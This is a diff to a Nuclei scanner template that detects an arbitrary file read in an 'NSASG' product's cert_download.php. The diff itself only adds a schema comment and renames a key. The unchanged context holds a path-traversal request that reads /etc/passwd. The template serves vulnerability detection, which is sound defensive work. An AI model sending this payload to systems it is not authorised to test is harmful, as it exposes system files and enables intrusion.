@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: nsasg-arbitrary-file-read
 
 info:
@@ -17,7 +18,7 @@ info:
     cwe-id: CWE-22
   tags: nsasg,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
